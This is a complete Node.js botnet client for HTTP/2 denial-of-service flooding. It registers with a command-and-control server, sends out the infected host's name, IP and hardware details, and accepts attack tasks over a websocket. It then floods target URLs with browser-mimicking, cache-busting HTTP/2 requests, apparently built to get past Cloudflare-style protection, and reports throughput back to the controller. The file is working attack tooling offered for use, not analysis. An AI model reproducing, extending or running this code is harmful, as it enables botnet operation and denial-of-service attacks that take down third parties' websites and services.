#!/usr/bin/env node

/**
 * 🔥 HTTP2-CF BOT - Optimized Single File
 * Fokus HTTP2-CF attack dengan stats real-time ke C2
 * 
 * Usage: node bot-http2cf.js
 */

import axios from 'axios';
import { io } from 'socket.io-client';
import os from 'os';
import crypto from 'crypto';
import http2 from 'http2';
import { URL } from 'url';

// ============================================
// CONFIG
// ============================================
const C2_URL = process.argv[2] || 'https://c2.aryapanel.xyz';
const API_KEY = 'aryzz-c2-api-key-2024';
const BOT_ID = crypto.randomUUID();

// ============================================
// COLORS
// ============================================
const c = {
    r: '\x1b[0m', red: '\x1b[31m', g: '\x1b[32m', y: '\x1b[33m', 
    b: '\x1b[34m', m: '\x1b[35m', c: '\x1b[36m'
};

const log = (msg, col = 'r') => console.log(`${c[col]}[${new Date().toLocaleTimeString()}] ${msg}${c.r}`);

// ============================================
// ATTACK STATS
// ============================================
const attacks = new Map();

class HTTP2CFAttack {
    constructor(id, target, duration, threads, rpc) {
        this.id = id;
        this.target = target;
        this.url = new URL(target);
        this.duration = duration;
        this.threads = threads;
        this.rpc = rpc;
        this.active = true;
        this.startTime = Date.now();
        
        // Stats
        this.totalRequests = 0;
        this.successfulRequests = 0;
        this.failedRequests = 0;
        this.totalBytes = 0;
        this.totalPackets = 0;
        
        // Connection pool
        this.connections = [];
        this.maxConnections = 10;
    }

    async getConnection() {
        // Clean old connections
        this.connections = this.connections.filter(c => !c.destroyed);
        
        // Create new if needed
        if (this.connections.length < this.maxConnections) {
            try {
                const client = http2.connect(this.url.origin, {
                    rejectUnauthorized: false,
                    maxSessionMemory: 10
                });
                client.on('error', () => {});
                this.connections.push(client);
                return client;
            } catch (e) {
                return null;
            }
        }
        
        return this.connections[Math.floor(Math.random() * this.connections.length)];
    }

    async sendRequest() {
        const client = await this.getConnection();
        if (!client || client.destroyed) return;

        return new Promise((resolve) => {
            try {
                const headers = {
                    ':method': 'GET',
                    ':path': this.url.pathname + this.url.search + (this.url.search ? '&' : '?') + `_=${Date.now()}`,
                    ':scheme': this.url.protocol.replace(':', ''),
                    ':authority': this.url.host,
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'accept-encoding': 'gzip, deflate, br',
                    'cache-control': 'no-cache',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1'
                };

                const headerSize = JSON.stringify(headers).length;
                const req = client.request(headers);
                
                let responded = false;
                const timeout = setTimeout(() => {
                    if (!responded) {
                        req.close();
                        this.failedRequests++;
                        resolve();
                    }
                }, 5000);

                req.on('response', (resHeaders) => {
                    responded = true;
                    clearTimeout(timeout);
                    this.successfulRequests++;
                    this.totalPackets++;
                    this.totalBytes += headerSize;
                });

                req.on('data', (chunk) => {
                    this.totalBytes += chunk.length;
                });

                req.on('end', () => {
                    clearTimeout(timeout);
                    resolve();
                });

                req.on('error', () => {
                    clearTimeout(timeout);
                    this.failedRequests++;
                    resolve();
                });

                req.end();
                this.totalRequests++;

            } catch (e) {
                this.failedRequests++;
                resolve();
            }
        });
    }

    async attack() {
        const promises = [];
        const batchSize = Math.min(this.rpc, 50);

        for (let i = 0; i < batchSize; i++) {
            promises.push(this.sendRequest());
        }

        await Promise.allSettled(promises);
        await new Promise(r => setTimeout(r, 10));
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);
        log(`⚡ HTTP2-CF Attack Started: ${this.target}`, 'y');
        log(`   Threads: ${this.threads}, Duration: ${this.duration}s, RPC: ${this.rpc}`, 'c');

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }

        this.stop();
    }

    stop() {
        this.active = false;
        for (const conn of this.connections) {
            try { conn.close(); } catch (e) {}
        }
        this.connections = [];
        
        const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
        log(`✅ Attack ${this.id.substring(0, 8)} completed`, 'g');
        log(`   Requests: ${this.totalRequests.toLocaleString()} | Success: ${this.successfulRequests.toLocaleString()}`, 'c');
    }

    getStats() {
        const elapsed = (Date.now() - this.startTime) / 1000 || 1;
        return {
            attackId: this.id,
            method: 'HTTP2-CF',
            target: this.target,
            totalRequests: this.totalRequests,
            successfulRequests: this.successfulRequests,
            failedRequests: this.failedRequests,
            totalBytes: this.totalBytes,
            totalPackets: this.totalPackets,
            rps: Math.floor(this.totalRequests / elapsed),
            pps: Math.floor(this.totalPackets / elapsed),
            gbps: parseFloat(((this.totalBytes * 8) / elapsed / 1000000000).toFixed(2)),
            elapsed: Math.floor(elapsed)
        };
    }
}

// ============================================
// BOT FUNCTIONS
// ============================================
async function getPublicIP() {
    try {
        const res = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
        return res.data.ip;
    } catch (e) {
        return '0.0.0.0';
    }
}

async function registerBot() {
    const botInfo = {
        id: BOT_ID,
        hostname: os.hostname(),
        ip: await getPublicIP(),
        os: `${os.type()} ${os.release()}`,
        arch: os.arch(),
        cpus: os.cpus().length,
        memory: Math.round(os.totalmem() / 1024 / 1024 / 1024),
        version: '1.0.0-http2cf'
    };

    try {
        const res = await axios.post(`${C2_URL}/api/bot/register`, botInfo, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 10000
        });

        if (res.data.success) {
            log(`✅ Bot registered: ${BOT_ID}`, 'g');
            log(`   IP: ${botInfo.ip} | CPUs: ${botInfo.cpus} | RAM: ${botInfo.memory}GB`, 'c');
            return true;
        }
    } catch (e) {
        log(`❌ Registration failed: ${e.message}`, 'red');
        return false;
    }
}

async function sendStats() {
    if (attacks.size === 0) return;

    try {
        const allStats = Array.from(attacks.values()).map(a => a.getStats());
        await axios.post(`${C2_URL}/api/bot/${BOT_ID}/stats`, 
            { attacks: allStats },
            { 
                headers: { 
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${API_KEY}`
                },
                timeout: 5000 
            }
        );
    } catch (e) {}
}

async function sendHeartbeat() {
    try {
        await axios.post(`${C2_URL}/api/bot/${BOT_ID}/heartbeat`, {
            stats: {
                cpu: os.loadavg()[0],
                memory: { total: os.totalmem(), free: os.freemem() },
                uptime: os.uptime(),
                activeAttacks: attacks.size
            }
        }, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 5000
        });
    } catch (e) {}
}

// ============================================
// WEBSOCKET
// ============================================
let socket, heartbeatTimer, statsTimer;

function connectWebSocket() {
    log(`🔌 Connecting to C2: ${C2_URL}`, 'c');

    socket = io(C2_URL, {
        transports: ['websocket'],
        reconnection: true,
        reconnectionDelay: 5000
    });

    socket.on('connect', () => {
        log('✅ WebSocket connected', 'g');
        socket.emit('bot:connect', { botId: BOT_ID, apiKey: API_KEY });
    });

    socket.on('connected', (data) => {
        if (data.success) {
            log('✅ Authenticated with C2', 'g');
            
            if (heartbeatTimer) clearInterval(heartbeatTimer);
            heartbeatTimer = setInterval(sendHeartbeat, 30000);
            
            if (statsTimer) clearInterval(statsTimer);
            statsTimer = setInterval(sendStats, 2000); // Update stats every 2s
        }
    });

    socket.on('task:new', async (task) => {
        log(`📥 New task: ${task.id}`, 'm');
        
        if (task.type === 'attack' && task.command.action === 'start_attack') {
            const { target, threads, duration, rpc } = task.command;
            
            const attack = new HTTP2CFAttack(task.id, target, duration, threads, rpc);
            attacks.set(task.id, attack);
            
            attack.start().catch(err => {
                log(`Attack error: ${err.message}`, 'red');
            }).finally(() => {
                attacks.delete(task.id);
            });
        }
    });

    socket.on('task:stop', (data) => {
        log(`⚠️  Stop task: ${data.taskId}`, 'y');
        const attack = attacks.get(data.taskId);
        if (attack) {
            attack.stop();
            attacks.delete(data.taskId);
        }
    });

    socket.on('disconnect', () => {
        log('🔌 WebSocket disconnected', 'y');
    });

    socket.on('error', (err) => {
        log(`WebSocket error: ${err}`, 'red');
    });
}

// ============================================
// MAIN
// ============================================
async function main() {
    console.log(`
╔═══════════════════════════════════════════════════════════╗
║           🔥 HTTP2-CF BOT - Single File 🔥               ║
╚═══════════════════════════════════════════════════════════╝
`);

    log(`Bot ID: ${BOT_ID}`, 'c');
    log(`C2 URL: ${C2_URL}`, 'c');
    log('', 'r');

    const registered = await registerBot();
    if (!registered) {
        log('Retrying in 5 seconds...', 'y');
        setTimeout(main, 5000);
        return;
    }

    connectWebSocket();
}

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
process.on('SIGINT', () => {
    log('\n⚠️  Shutting down...', 'y');
    
    for (const [id, attack] of attacks) {
        attack.stop();
    }
    
    if (heartbeatTimer) clearInterval(heartbeatTimer);
    if (statsTimer) clearInterval(statsTimer);
    if (socket) socket.disconnect();
    
    log('✅ Bot stopped', 'g');
    process.exit(0);
});

// START
main().catch(err => {
    log(`Fatal error: ${err.message}`, 'red');
    process.exit(1);
});
